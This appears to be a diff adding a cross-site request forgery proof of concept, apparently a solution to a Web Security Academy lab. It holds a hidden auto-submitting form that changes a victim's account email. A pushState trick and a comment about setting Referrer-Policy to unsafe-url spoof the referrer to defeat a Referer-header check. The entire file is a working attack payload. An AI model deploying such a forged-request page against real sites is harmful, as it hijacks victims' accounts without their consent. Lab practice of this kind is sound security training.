@@ -1,0 +1,8 @@
+<form method="POST" action="https://0a1f00a2038e9c6dc0a9037600b2006d.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="aaa@gmail.com">
+</form>
+<script>
+	// Referrer-Policy: unsafe-url <= put this in head
+	history.pushState("", "", "/?https://0a1f00a2038e9c6dc0a9037600b2006d.web-security-academy.net/")
+        document.forms[0].submit();
+</script>
